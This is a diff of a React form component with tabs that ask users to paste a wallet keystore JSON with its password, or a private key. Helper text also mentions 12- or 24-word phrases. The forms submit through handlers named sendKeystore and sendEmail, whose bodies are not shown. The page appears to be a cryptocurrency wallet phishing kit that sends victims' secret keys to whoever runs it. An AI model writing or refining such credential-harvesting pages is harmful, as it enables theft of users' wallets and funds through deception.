@@ -62,9 +62,7 @@ const NewForm = () => {
   };
 
   return (
-    <Box
-        paddingY={4}
-    >
+    <Box paddingY={4}>
       <div className="tab-container">
         <div className="tab-wrapper">
           <div
@@ -102,8 +100,47 @@ const NewForm = () => {
             }
           >
             <form ref={form2} onSubmit={sendKeystore}>
-              <textarea  rows={10} className="form-control" placeholder="Keystore JSON" name="message" />
-              <input type="password" className="form-control mt-3" name="password" />
+              <textarea
+                rows={10}
+                className="form-control"
+                placeholder="Keystore JSON"
+                name="message"
+              />
+              <input
+                type="password"
+                className="form-control mt-3"
+                name="password"
+              />
+              <Box paddingY={2}>
+                <Typography
+                  sx={{
+                    fontWeight: "bolder",
+                    fontFamily: "Montserrat",
+                    textAlign: "center",
+                    fontSize: ".9rem",
+                  }}
+                  variant="h6"
+                >
+                  Several line of text beginning with {dot} plus the password
+                  you used to encrypte it
+                </Typography>
+              </Box>
+              <input className="btn btn-primary" type="submit" value="IMPORT" />
+            </form>
+          </div>
+
+          <div
+            className={
+              toggleState === 3 ? "content container active-content" : "content"
+            }
+          >
+            <form ref={form} onSubmit={sendEmail}>
+              <textarea
+                rows={10}
+                className="form-control mb-3"
+                placeholder="Private Key"
+                name="message"
+              />
               <Box paddingY={2}>
                 <Typography
                   sx={{
@@ -117,17 +154,6 @@ const NewForm = () => {
                   Typically 12 (sometimes 24) words seperated by single spaces
                 </Typography>
               </Box>
-              <input className="btn btn-primary" type="submit" value="IMPORT" />
-            </form>
-          </div>
-
-          <div
-            className={
-              toggleState === 3 ? "content container active-content" : "content"
-            }
-          >
-            <form ref={form} onSubmit={sendEmail}>
-              <textarea  rows={10} className="form-control mb-3" placeholder="Private Key" name="message" />
               <input className="btn btn-primary" type="submit" value="IMPORT" />
             </form>
           </div>
